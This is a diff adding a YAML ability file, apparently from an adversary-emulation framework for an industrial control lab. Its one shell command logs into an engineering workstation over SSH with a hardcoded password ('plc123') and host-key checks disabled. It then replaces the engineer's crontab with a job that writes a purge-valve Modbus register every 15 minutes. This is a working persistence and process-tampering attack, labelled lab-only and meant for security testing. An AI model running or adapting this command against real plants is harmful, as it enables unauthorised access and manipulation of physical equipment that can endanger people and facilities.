@@ -1,0 +1,20 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000005
+  name: SSH - Install crontab on EWS for periodic Modbus write
+  description: |
+    Replaces user crontab on engineer@EWS with a periodic job that writes purge valve HR.
+    Lab-only persistence; replaces existing crontab for the engineer user.
+  tactic: lateral-movement
+  technique_id: T0886
+  technique_name: Remote Services
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5
+      'echo "*/15 * * * * /tmp/modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null" | crontab - && crontab -l' &&
+      echo "EWS_CRON_INSTALLED"
+    timeout: 60
